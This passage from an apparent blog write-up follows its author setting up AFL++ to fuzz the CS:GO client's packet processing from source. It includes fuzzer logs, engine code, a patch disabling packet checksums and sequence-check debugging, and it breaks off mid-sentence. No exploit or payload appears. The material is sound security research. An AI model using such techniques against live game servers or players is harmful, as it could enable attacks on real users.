Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
****loading serverbrowser_client.so

```
{% endraw %}


That is very promising!

After that I get this:

{% raw %}
```

[D] DEBUG: calibration stage 10/12
[D] DEBUG: calibration stage 11/12
[D] DEBUG: calibration stage 12/12
    len = 67, map size = 0, exec speed = 2841 us
[!] WARNING: Instrumentation output varies across runs.
[*] Attempting dry run with 'id:000084,time:0,execs:0,orig:packet915.dat'...
[D] DEBUG: calibration stage 1/7

[-] PROGRAM ABORT : No instrumentation detected
         Location : perform_dry_run(), src/afl-fuzz-init.c:1107



```
{% endraw %}

No instrumentation? But I am sure that I compiled with afl-gcc-fast ?

Again, it would be helpful if the program told which file does not have instrumentation, because then that would narrow shit down more. I actually made a slight mistake and ran the afl-fuzz with @@ at the end, but that is now wrong because we are taking input from the shared memory thing instead. Lets try replaceing that with a samplefilename and try again?

No, that wasn't it. Maybe try running with export AFL_SKIP_BIN_CHECK=1 ? That should skip the binary checks, but I dunno how it goes. Lets try it:

This seems to just run the binary without the forkserver shit:

{% raw %}
```
[!] WARNING: Test case results in a timeout (skipping)
[*] Attempting dry run with 'id:000014,time:0,execs:0,orig:packet985.dat'...
[D] DEBUG: calibration stage 1/7
SDL video target is 'x11'
SDL failed to create GL compatibility profile (whichProfile=0!
This system supports the OpenGL extension GL_EXT_framebuffer_object.
This system supports the OpenGL extension GL_EXT_framebuffer_blit.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample.
This system DOES NOT support the OpenGL extension GL_APPLE_fence.
This system DOES NOT support the OpenGL extension GL_NV_fence.
This system supports the OpenGL extension GL_ARB_sync.
This system supports the OpenGL extension GL_EXT_draw_buffers2.
This system DOES NOT support the OpenGL extension GL_EXT_bindable_uniform.
This system DOES NOT support the OpenGL extension GL_APPLE_flush_buffer_range.
This system supports the OpenGL extension GL_ARB_map_buffer_range.
This system supports the OpenGL extension GL_ARB_vertex_buffer_object.
This system supports the OpenGL extension GL_ARB_occlusion_query.
This system DOES NOT support the OpenGL extension GL_APPLE_texture_range.
This system DOES NOT support the OpenGL extension GL_APPLE_client_storage.
This system DOES NOT support the OpenGL extension GL_ARB_uniform_buffer.
This system supports the OpenGL extension GL_ARB_vertex_array_bgra.
This system supports the OpenGL extension GL_EXT_vertex_array_bgra.
This system supports the OpenGL extension GL_ARB_framebuffer_object.
This system DOES NOT support the OpenGL extension GL_GREMEDY_string_marker.
This system supports the OpenGL extension GL_ARB_debug_output.
This system supports the OpenGL extension GL_EXT_direct_state_access.
This system DOES NOT support the OpenGL extension GL_NV_bindless_texture.
This system DOES NOT support the OpenGL extension GL_AMD_pinned_memory.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample_blit_scaled.
This system supports the OpenGL extension GL_EXT_texture_sRGB_decode.
This system DOES NOT support the OpenGL extension GL_NVX_gpu_memory_info.
This system DOES NOT support the OpenGL extension GL_ATI_meminfo.
This system supports the OpenGL extension GL_EXT_texture_compression_s3tc.
This system supports the OpenGL extension GL_EXT_texture_compression_dxt1.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt3.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
[!] WARNING: Test case results in a timeout (skipping)
[*] Attempting dry run with 'id:000015,time:0,execs:0,orig:packet984.dat'...
[D] DEBUG: calibration stage 1/7
SDL video target is 'x11'
SDL failed to create GL compatibility profile (whichProfile=0!
This system supports the OpenGL extension GL_EXT_framebuffer_object.
This system supports the OpenGL extension GL_EXT_framebuffer_blit.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample.
This system DOES NOT support the OpenGL extension GL_APPLE_fence.
This system DOES NOT support the OpenGL extension GL_NV_fence.
This system supports the OpenGL extension GL_ARB_sync.
This system supports the OpenGL extension GL_EXT_draw_buffers2.
This system DOES NOT support the OpenGL extension GL_EXT_bindable_uniform.
This system DOES NOT support the OpenGL extension GL_APPLE_flush_buffer_range.
This system supports the OpenGL extension GL_ARB_map_buffer_range.
This system supports the OpenGL extension GL_ARB_vertex_buffer_object.
This system supports the OpenGL extension GL_ARB_occlusion_query.
This system DOES NOT support the OpenGL extension GL_APPLE_texture_range.
This system DOES NOT support the OpenGL extension GL_APPLE_client_storage.
This system DOES NOT support the OpenGL extension GL_ARB_uniform_buffer.
This system supports the OpenGL extension GL_ARB_vertex_array_bgra.
This system supports the OpenGL extension GL_EXT_vertex_array_bgra.
This system supports the OpenGL extension GL_ARB_framebuffer_object.
This system DOES NOT support the OpenGL extension GL_GREMEDY_string_marker.
This system supports the OpenGL extension GL_ARB_debug_output.
This system supports the OpenGL extension GL_EXT_direct_state_access.
This system DOES NOT support the OpenGL extension GL_NV_bindless_texture.
This system DOES NOT support the OpenGL extension GL_AMD_pinned_memory.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample_blit_scaled.
This system supports the OpenGL extension GL_EXT_texture_sRGB_decode.
This system DOES NOT support the OpenGL extension GL_NVX_gpu_memory_info.
This system DOES NOT support the OpenGL extension GL_ATI_meminfo.
This system supports the OpenGL extension GL_EXT_texture_compression_s3tc.
This system supports the OpenGL extension GL_EXT_texture_compression_dxt1.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt3.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
[!] WARNING: Test case results in a timeout (skipping)
[*] Attempting dry run with 'id:000016,time:0,execs:0,orig:packet983.dat'...
[D] DEBUG: calibration stage 1/7
SDL video target is 'x11'
SDL failed to create GL compatibility profile (whichProfile=0!
This system supports the OpenGL extension GL_EXT_framebuffer_object.
This system supports the OpenGL extension GL_EXT_framebuffer_blit.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample.
This system DOES NOT support the OpenGL extension GL_APPLE_fence.
This system DOES NOT support the OpenGL extension GL_NV_fence.
This system supports the OpenGL extension GL_ARB_sync.
This system supports the OpenGL extension GL_EXT_draw_buffers2.
This system DOES NOT support the OpenGL extension GL_EXT_bindable_uniform.
This system DOES NOT support the OpenGL extension GL_APPLE_flush_buffer_range.
This system supports the OpenGL extension GL_ARB_map_buffer_range.
This system supports the OpenGL extension GL_ARB_vertex_buffer_object.
This system supports the OpenGL extension GL_ARB_occlusion_query.
This system DOES NOT support the OpenGL extension GL_APPLE_texture_range.
This system DOES NOT support the OpenGL extension GL_APPLE_client_storage.
This system DOES NOT support the OpenGL extension GL_ARB_uniform_buffer.
This system supports the OpenGL extension GL_ARB_vertex_array_bgra.
This system supports the OpenGL extension GL_EXT_vertex_array_bgra.
This system supports the OpenGL extension GL_ARB_framebuffer_object.
This system DOES NOT support the OpenGL extension GL_GREMEDY_string_marker.
This system supports the OpenGL extension GL_ARB_debug_output.
This system supports the OpenGL extension GL_EXT_direct_state_access.
This system DOES NOT support the OpenGL extension GL_NV_bindless_texture.
This system DOES NOT support the OpenGL extension GL_AMD_pinned_memory.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample_blit_scaled.
This system supports the OpenGL extension GL_EXT_texture_sRGB_decode.
This system DOES NOT support the OpenGL extension GL_NVX_gpu_memory_info.
This system DOES NOT support the OpenGL extension GL_ATI_meminfo.
This system supports the OpenGL extension GL_EXT_texture_compression_s3tc.
This system supports the OpenGL extension GL_EXT_texture_compression_dxt1.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt3.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
[!] WARNING: Test case results in a timeout (skipping)
[*] Attempting dry run with 'id:000017,time:0,execs:0,orig:packet982.dat'...
[D] DEBUG: calibration stage 1/7
SDL video target is 'x11'
SDL failed to create GL compatibility profile (whichProfile=0!
This system supports the OpenGL extension GL_EXT_framebuffer_object.
This system supports the OpenGL extension GL_EXT_framebuffer_blit.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample.
This system DOES NOT support the OpenGL extension GL_APPLE_fence.
This system DOES NOT support the OpenGL extension GL_NV_fence.
This system supports the OpenGL extension GL_ARB_sync.
This system supports the OpenGL extension GL_EXT_draw_buffers2.
This system DOES NOT support the OpenGL extension GL_EXT_bindable_uniform.
This system DOES NOT support the OpenGL extension GL_APPLE_flush_buffer_range.
This system supports the OpenGL extension GL_ARB_map_buffer_range.
This system supports the OpenGL extension GL_ARB_vertex_buffer_object.
This system supports the OpenGL extension GL_ARB_occlusion_query.
This system DOES NOT support the OpenGL extension GL_APPLE_texture_range.
This system DOES NOT support the OpenGL extension GL_APPLE_client_storage.
This system DOES NOT support the OpenGL extension GL_ARB_uniform_buffer.
This system supports the OpenGL extension GL_ARB_vertex_array_bgra.
This system supports the OpenGL extension GL_EXT_vertex_array_bgra.
This system supports the OpenGL extension GL_ARB_framebuffer_object.
This system DOES NOT support the OpenGL extension GL_GREMEDY_string_marker.
This system supports the OpenGL extension GL_ARB_debug_output.
This system supports the OpenGL extension GL_EXT_direct_state_access.
This system DOES NOT support the OpenGL extension GL_NV_bindless_texture.
This system DOES NOT support the OpenGL extension GL_AMD_pinned_memory.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample_blit_scaled.
This system supports the OpenGL extension GL_EXT_texture_sRGB_decode.
This system DOES NOT support the OpenGL extension GL_NVX_gpu_memory_info.
This system DOES NOT support the OpenGL extension GL_ATI_meminfo.
This system supports the OpenGL extension GL_EXT_texture_compression_s3tc.
This system supports the OpenGL extension GL_EXT_texture_compression_dxt1.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt3.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
[!] WARNING: Test case results in a timeout (skipping)
[*] Attempting dry run with 'id:000018,time:0,execs:0,orig:packet981.dat'...
[D] DEBUG: calibration stage 1/7
SDL video target is 'x11'
SDL failed to create GL compatibility profile (whichProfile=0!
This system supports the OpenGL extension GL_EXT_framebuffer_object.
This system supports the OpenGL extension GL_EXT_framebuffer_blit.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample.
This system DOES NOT support the OpenGL extension GL_APPLE_fence.
This system DOES NOT support the OpenGL extension GL_NV_fence.
This system supports the OpenGL extension GL_ARB_sync.
This system supports the OpenGL extension GL_EXT_draw_buffers2.
This system DOES NOT support the OpenGL extension GL_EXT_bindable_uniform.
This system DOES NOT support the OpenGL extension GL_APPLE_flush_buffer_range.
This system supports the OpenGL extension GL_ARB_map_buffer_range.
This system supports the OpenGL extension GL_ARB_vertex_buffer_object.
This system supports the OpenGL extension GL_ARB_occlusion_query.
This system DOES NOT support the OpenGL extension GL_APPLE_texture_range.
This system DOES NOT support the OpenGL extension GL_APPLE_client_storage.
This system DOES NOT support the OpenGL extension GL_ARB_uniform_buffer.
This system supports the OpenGL extension GL_ARB_vertex_array_bgra.
This system supports the OpenGL extension GL_EXT_vertex_array_bgra.
This system supports the OpenGL extension GL_ARB_framebuffer_object.
This system DOES NOT support the OpenGL extension GL_GREMEDY_string_marker.
This system supports the OpenGL extension GL_ARB_debug_output.
This system supports the OpenGL extension GL_EXT_direct_state_access.
This system DOES NOT support the OpenGL extension GL_NV_bindless_texture.
This system DOES NOT support the OpenGL extension GL_AMD_pinned_memory.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample_blit_scaled.
This system supports the OpenGL extension GL_EXT_texture_sRGB_decode.
This system DOES NOT support the OpenGL extension GL_NVX_gpu_memory_info.
This system DOES NOT support the OpenGL extension GL_ATI_meminfo.
This system supports the OpenGL extension GL_EXT_texture_compression_s3tc.
This system supports the OpenGL extension GL_EXT_texture_compression_dxt1.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt3.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
```
{% endraw %}
In the afl source code the result of the calibration is detected by this line: `res = calibrate_case(afl, q, use_mem, 0, 1);` and if the res is FSRV_RUN_NOINST then it displays that.


Ah, I see the problem. The reason for that is that we are not setting the length of the packet which we are fuzzing correctly.

See, internally the code checks the instrumentation of a binary by this code:

{% raw %}
```

    (void)write_to_testcase(afl, (void **)&use_mem, q->len, 1);

    fault = fuzz_run_target(afl, &afl->fsrv, use_tmout);

    /* afl->stop_soon is set by the handler for Ctrl+C. When it's pressed,
       we want to bail out quickly. */

    if (afl->stop_soon || fault != afl->crash_mode) { goto abort_calibration; }

    if (!afl->non_instrumented_mode && !afl->stage_cur &&
        !count_bytes(afl, afl->fsrv.trace_bits)) {

      fault = FSRV_RUN_NOINST;
      goto abort_calibration;

    }

```
{% endraw %}
inside afl-fuzz-run.c . I forgot to set the length of the packet so the packet length is always zero, therefore because the program always takes the same path, the count_bytes(afl, afl->fsrv.trace_bits) call results in zero.


Then in afl-fuzz-bitmap.c there is even a very helpful comment about this:

{% raw %}
```

/* Count the number of bytes set in the bitmap. Called fairly sporadically,
   mostly to update the status screen or calibrate and examine confirmed
   new paths. */

u32 count_bytes(afl_state_t *afl, u8 *mem) {
    ...

```
{% endraw %}

atleast that is my first thought, though I am a bit skeptical since we should still get some bits set even though we are calling the packet processing thing in a wrong way, but lets try that still:

Fix...
Recompile...
Run...

aandd:

Holy shit it now works! Lets see if it actually starts fuzzing. It is still going through the dry run with the corpus.

And it actually starts fuzzing!

Fantastic!


## More code investigation

I am suspicious about the zero crashes which we have as of now. I read somewhere that CSGO actually uses googles protobuf messages as the network messages between client and server. Lets investigate the code and see where it does that:

There is this in baseclientstate.cpp :

{% raw %}
```


void CBaseClientState::ConnectionStart(INetChannel *chan)
{
	m_NETMsgTick.Bind< CNETMsg_Tick_t >( chan, UtlMakeDelegate( this, &CBaseClientState::NETMsg_Tick ) );
	m_NETMsgStringCmd.Bind< CNETMsg_StringCmd_t >( chan, UtlMakeDelegate( this, &CBaseClientState::NETMsg_StringCmd ) );
	m_NETMsgSignonState.Bind< CNETMsg_SignonState_t >( chan, UtlMakeDelegate( this, &CBaseClientState::NETMsg_SignonState ) );
	m_NETMsgSetConVar.Bind< CNETMsg_SetConVar_t >( chan, UtlMakeDelegate( this, &CBaseClientState::NETMsg_SetConVar ) );
	m_NETMsgPlayerAvatarData.Bind< CNETMsg_PlayerAvatarData_t >( chan, UtlMakeDelegate( this, &CBaseClientState::NETMsg_PlayerAvatarData ) );
	
	m_SVCMsgServerInfo.Bind< CSVCMsg_ServerInfo_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_ServerInfo ) );
	m_SVCMsgClassInfo.Bind< CSVCMsg_ClassInfo_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_ClassInfo ) );
	m_SVCMsgSendTable.Bind< CSVCMsg_SendTable_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_SendTable ) );
	m_SVCMsgCmdKeyValues.Bind< CSVCMsg_CmdKeyValues_t>( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_CmdKeyValues ) );
	m_SVCMsg_EncryptedData.Bind< CSVCMsg_EncryptedData_t>( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_EncryptedData ) );
	m_SVCMsgPrint.Bind< CSVCMsg_Print_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_Print ) );
	m_SVCMsgSetPause.Bind< CSVCMsg_SetPause_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_SetPause ) );
	m_SVCMsgSetView.Bind< CSVCMsg_SetView_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_SetView ) );
	m_SVCMsgCreateStringTable.Bind< CSVCMsg_CreateStringTable_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_CreateStringTable ) );
	m_SVCMsgUpdateStringTable.Bind< CSVCMsg_UpdateStringTable_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_UpdateStringTable ) );
	m_SVCMsgVoiceInit.Bind< CSVCMsg_VoiceInit_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_VoiceInit ) );
	m_SVCMsgVoiceData.Bind< CSVCMsg_VoiceData_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_VoiceData ) );	
	m_SVCMsgFixAngle.Bind< CSVCMsg_FixAngle_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_FixAngle ) );
	m_SVCMsgPrefetch.Bind< CSVCMsg_Prefetch_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_Prefetch ) );
	m_SVCMsgCrosshairAngle.Bind< CSVCMsg_CrosshairAngle_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_CrosshairAngle ) );
	m_SVCMsgBSPDecal.Bind< CSVCMsg_BSPDecal_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_BSPDecal ) );
	m_SVCMsgSplitScreen.Bind< CSVCMsg_SplitScreen_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_SplitScreen ) );
	m_SVCMsgGetCvarValue.Bind< CSVCMsg_GetCvarValue_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_GetCvarValue ) );
	m_SVCMsgMenu.Bind< CSVCMsg_Menu_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_Menu ) );
	m_SVCMsgUserMessage.Bind< CSVCMsg_UserMessage_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_UserMessage ) );
	m_SVCMsgPaintmapData.Bind< CSVCMsg_PaintmapData_t >( chan, UtlMakeDelegate(this, &CBaseClientState::SVCMsg_PaintmapData ) );
	m_SVCMsgGameEvent.Bind< CSVCMsg_GameEvent_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_GameEvent ) );
	m_SVCMsgGameEventList.Bind< CSVCMsg_GameEventList_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_GameEventList ) );
	m_SVCMsgTempEntities.Bind< CSVCMsg_TempEntities_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_TempEntities ) );
	m_SVCMsgPacketEntities.Bind< CSVCMsg_PacketEntities_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_PacketEntities ) );
	m_SVCMsgSounds.Bind< CSVCMsg_Sounds_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_Sounds ) );
	m_SVCMsgEntityMsg.Bind< CSVCMsg_EntityMsg_t >( chan, UtlMakeDelegate( this, &CBaseClientState::SVCMsg_EntityMsg ) );	
}


```
{% endraw %}

Which basically lists all of the messages possible for us.

-----------------------

## Why won't it find new coverage?

As I said, all of these messages use the googles protobuf protocol. There is actually a protobuf fuzzing library already out there: https://github.com/google/libprotobuf-mutator .

Also all of the protobuf messages are described in netmessages.proto .

Also there is way to record demos on csgo: just type record recordname.dem and you are done. I am saying this because I found this on the web: https://github.com/kaimallea/demoinfogo-linux which dumps every message.

This in conjunction with recording the packets themselves with the NET_LogPacket function we can investigate the protocol further.

After dumping some messages and then comparing them to the dump of the demo file, I can't really find any occurences where the strings match? That is quite odd.

Lets see how the m_DemoRecorder actually records the messages:

Looking at the net_ws.cpp code the connectionless (aka UDP) packets get processed with ProcessConnectionlessPacket in baseclientstate.cpp and looking at that code I don't see that the packet gets recorded anywhere so that can not be the reason why I can not find any correlations. Right?

Looking at the ProcessPacket on the other hand reveals that the packet gets logged in the demofile with this:

{% raw %}
```

// tell message handler that packet is completely parsed
	m_MessageHandler->PacketEnd();

#if !defined(DEDICATED)
// tell demo system that packet is completely parsed
	if ( m_DemoRecorder && !demoplayer->IsPlayingBack() )
	{
		m_DemoRecorder->RecordPacket();
	}
#endif
}


```
{% endraw %}


what is RecordPacket?


{% raw %}
```

void CDemoRecorder::RecordPacket()
{
	WriteMessages( m_MessageData );

	m_MessageData.Reset(); // clear message buffer
	
	if ( m_bCloseDemoFile )
	{
		CloseDemoFile();
	}
}


void CDemoRecorder::WriteMessages( bf_write &message )
{
	if ( !m_DemoFile.IsOpen() )
		return;

	int len = message.GetNumBytesWritten();

	if (len <= 0)
		return;

	// fill last bits in last byte with NOP if necessary
	int nRemainingBits = message.GetNumBitsWritten() % 8;
	if ( nRemainingBits > 0 &&  nRemainingBits <= (8-NETMSG_TYPE_BITS) )
	{
		CNETMsg_NOP_t nop;
		nop.WriteToBuffer( message );
	}

	Assert( len < NET_MAX_MESSAGE );

	// if signondata read as fast as possible, no rewind
	// and wait for packet time
	unsigned char cmd = m_bIsDemoHeader ? dem_signon : dem_packet;

	if ( cmd == dem_packet )
	{
		m_nFrameCount++;
	}

	// write command & time
	m_DemoFile.WriteCmdHeader( cmd, GetRecordingTick(), 0 ); 
	
	democmdinfo_t info;
	// Snag current info
	GetClientCmdInfo( info );
		
	// Store it
	m_DemoFile.WriteCmdInfo( info );
		
	// write network channel sequencing infos
	int nOutSequenceNr, nInSequenceNr, nOutSequenceNrAck;
	GetBaseLocalClient().m_NetChannel->GetSequenceData( nOutSequenceNr, nInSequenceNr, nOutSequenceNrAck );
	m_DemoFile.WriteSequenceInfo( nInSequenceNr, nOutSequenceNrAck );
	
	// Output the messge buffer.
	m_DemoFile.WriteRawData( (char*) message.GetBasePointer(), len );

	if ( demo_debug.GetInt() >= 1 )
	{
		Msg( "Writing demo message %i bytes at file pos %i\n", len, m_DemoFile.GetCurPos( false ) );
	}
}




void CDemoFile::WriteRawData( const char *buffer, int length )
{
	DemoFileDbg( "WriteRawData()\n" );
	MEM_ALLOC_CREDIT();

	Assert( m_pBuffer && m_pBuffer->IsInitialized() );
	m_pBuffer->PutInt( length );
	m_pBuffer->Put( buffer, length );
}






```
{% endraw %}

I modified the Codecoveragething binary stuff and now it won't work! Fuck:

{% raw %}
```
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
Module engine_client.so failed to load! Error: ((null))
AppFramework : Unable to load module engine_client.so!
Unable to load interface VCvarQuery001 from engine_client.so, requested from EXE.




```
{% endraw %}

Just compile it with -O3 and with a normal compile?

Anyway back to the demo thing. The demo recorder should just write the raw packets without doing really any modifications to them so why aren't we observing the same strings in the demo file as in the dumped packets themselves?

Demo file:

{% raw %}
```

cyberhacker@cyberhacker-h8-1131sc:~/Codecoveragething/game/csgo$ cat demothingoof.dem | grep amage
Binary file (standard input) matches

```
{% endraw %}

the packets:

{% raw %}
```

packet1468.dat  packet2030.dat  packet2593.dat  packet3156.dat  packet3719.dat  packet4281.dat  packet997.dat
packet1469.dat  packet2031.dat  packet2594.dat  packet3157.dat  packet371.dat   packet4282.dat  packet998.dat
packet146.dat   packet2032.dat  packet2595.dat  packet3158.dat  packet3720.dat  packet4283.dat  packet999.dat
packet1470.dat  packet2033.dat  packet2596.dat  packet3159.dat  packet3721.dat  packet4284.dat
packet1471.dat  packet2034.dat  packet2597.dat  packet315.dat   packet3722.dat  packet4285.dat
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ grep -iRl "amage"
^C
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ cat * | grep amage
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$

```
{% endraw %}


Why?

I have no idea where the "Damage Taken" string is being written to the file. Search the source for that?

Oh, yeah the replay demo files also log console command stuff:

{% raw %}
```

void CDemoRecorder::RecordCommand( const char *cmdstring )

```
{% endraw %}

Anyway yeah, but how do we fuzz the thing with the protobuf?

Now, when doing research I found this: https://github.com/brymko/csgo-exploits . The guy developed a proxy for csgo messages which is quite handy. He even implemented the encryption scheme for the game. The thing is that we have access to the source code so we do not even need to decrypt the messages! Very convenient! Also another thing looking at the code there is this piece of code:

{% raw %}
```


	if ( ShouldChecksumPackets() )
	{
		unsigned short usCheckSum = (unsigned short)packet->message.ReadUBitLong( 16 );

		// Checksum applies to rest of packet
		Assert( !( packet->message.GetNumBitsRead() % 8 ) );
		int nOffset = packet->message.GetNumBitsRead() >> 3;
		int nCheckSumBytes = packet->message.TotalBytesAvailable() - nOffset;
	
		const void *pvData = packet->message.GetBasePointer() + nOffset;
		unsigned short usDataCheckSum = BufferToShortChecksum( pvData, nCheckSumBytes );
	
		if ( usDataCheckSum != usCheckSum )
		{
			ConMsg ("%s:corrupted packet %i at %i\n"
				, GetAddress()
				, sequence
				, m_nInSequenceNr);
			return -1;
		}
	}

```
{% endraw %}

in ProcessPacketHeader. THIS is the reason why we are getting shit coverage. When mutating the packet, the checksum then changes and it fails because of this here. and in the ProcessPacket code there is this part:

{% raw %}
```
	if ( bHasHeader	)
	{
		flags = ProcessPacketHeader( packet );
	}

	if ( flags == -1 )
		return; // invalid header/packet
```
{% endraw %}

so we basically bail out.

But the thing is that:

{% raw %}
```
// We only need to checksum packets on the PC and only when we're actually sending them over the network.
bool ShouldChecksumPackets()
{
	return NET_IsMultiplayer();
}
```
{% endraw %}
We only check the stuff when we are in multiplayer, but when we just do map de_dust2 we should be in singleplayer mode right?

Well, lets add a debug message there and see what happens!

Aaand it looks like this is the problem! The game still sets multiplayer mode to on, even though you play on your own host!

Time to patch that shit out and lets try fuzzing again!

original:

{% raw %}
```


	if ( ShouldChecksumPackets() )
	{
		unsigned short usCheckSum = (unsigned short)packet->message.ReadUBitLong( 16 );


```
{% endraw %}

new:

{% raw %}
```

	if ( false )
	{
		unsigned short usCheckSum = (unsigned short)packet->message.ReadUBitLong( 16 );



```
{% endraw %}

Lets try fuzzing now!

Now, I am expecting to get many crashes almost immediately

Again, the time which it takes to start the forkserver is absolutely insane. Every time I start fuzzing I need to wait for like five minutes for the thing to do its thing before the fuzzing itself actually starts. I hope that afl-fuzz does not like spin it up on every single crash. Otherwise I am fucked.

It still doesn't work! I think that this is because the program is not stateless and the current state of the program depends on the previous packets already sent. Now we are sending all of these packets even though we aren't inside the game match itself and because of that we aren't getting any coverage. Maybe if we wait a bit before starting the fuzzing, like a set amount of packets for example? Maybe that will help.

It looks like setting the checksum checking to off somehow fucks up something else, because now I can not even join the damn thing! I am going to replace the other calls to ShouldChecksumPackets to false just in case.

The program works fine without the checksum checks so maybe it was something to do with the other stuff?

Ok, now lets see what happens!

Aannd we get no new coverage. That's odd. Looking at the console.log file (the log file which, ya know, logs the stuff):

{% raw %}
```

Called NET_ProcessSocket! thingoof
Packet was loopback packet
Packet count: 1001
Packet count: 1001
Called fuzz_main_loop
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
loopback:reliable state invalid (0).
Checking stuff:
Netchannel: unknown net message (164) from loopback.
unknown message
 Dumping messages for channel CLIENT(loopback) 0x0x629000758200
Header bits 80, flags == 0
0 messages
Raw
PKT  >>  .............$.......... ff020000 e8000000 00d0a401 09240802 10011a1e fb050000   
PKT  >>  ....t=..j..3............ fa0c0000 743daa05 6ab80433 040100c2 87880000 00000000   
PKT  >>  ....... ...(...0...      0000040f 08bc0620 e7fb0d28 faff0130 aefc01              
Checking stuff:
Checking stuff:
Checking stuff:
Checking stuff:
Checking stuff:
Checking stuff:
Checking stuff:
Checking stuff:

...
...

```
{% endraw %}


inside ProcessPacketHeader:

{% raw %}
```

	if (sequence <= m_nInSequenceNr )
	{
		if ( net_showdrop.GetInt() )
		{
			if ( sequence == m_nInSequenceNr )
			{
				ConMsg ("%s:duplicate packet %i at %i\n"
					, GetAddress()
					, sequence
					, m_nInSequenceNr);
			}
			else
			{
				ConMsg ("%s:out of order packet %i at %i\n"
					, GetAddress()
					, sequence
					, m_nInSequenceNr);
			}
		}
		Warning("sequence <= m_nInSequenceNr\n");
		ConMsg("sequence <= m_nInSequenceNr\n");
		return -1;
	}


```
{% endraw %}

so lets try to run with +net_showdrop 1 and after literally littering the code with debug messages:

After running with the debugging messages, we get this in console.log :

{% raw %}
```

Called NET_ProcessSocket! thingoof
Called NET_ProcessSocket! thingoof
Packet was loopback packet
Packet count: 1001
Packet count: 1001
Called fuzz_main_loop
Checking stuff:
!ReadSubChannelData( msg, i )
!ReadSubChannelData( msg, i )
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1

...
...

```
{% endraw %}

here is the code:

{% raw %}
```

